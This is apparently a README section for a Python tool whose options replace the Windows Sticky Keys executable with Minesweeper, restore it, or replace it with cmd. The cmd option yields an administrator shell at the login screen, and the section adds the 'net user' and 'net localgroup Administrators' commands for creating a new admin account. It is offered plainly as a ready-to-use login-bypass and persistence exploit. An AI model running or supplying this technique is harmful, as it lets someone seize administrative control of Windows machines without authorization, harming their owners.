# [Sticky keys](./StickyKeys.py) exploits
- `./pld.py --sticky-mines` (Sticky keys to minesweeper)
	- This will change the sticky keys executable to Minesweeper, allowing you to summon minesweeper at a spam of the left shift
- `./pld.py --sticky-do` (Restore sticky keys to default)
	- This will restore the sticky keys executable to the default
- `./pld.py --sticky-keys` (Change sticky keys to CMD)
	- This will change the sticky keys executable to cmd, allowing access to the admin shell when sticky keys is spammed at the login screen. 
		- This allows you to create new admin users, and freely use your PLD:
		  ```sh
		  net user /add <user> <password>
		  net localgroup Administrators /add <user>
		  ```
